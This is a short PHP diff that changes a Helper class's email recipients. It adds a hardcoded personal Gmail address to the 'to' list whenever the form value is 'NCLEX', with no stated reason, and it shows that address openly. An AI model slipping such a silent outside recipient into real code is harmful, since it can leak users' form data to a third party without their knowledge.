@@ -164,6 +164,10 @@ class Helper
 
         $to[] = trim($user->email);
         $to[] = (isset($others['email'])) ? trim($others['email']) : '';
+        
+        if($vars['{$form}'] == 'NCLEX') {
+          $to[] = 'partanduls@gmail.com';
+        }
 
 
         $bcc = [];
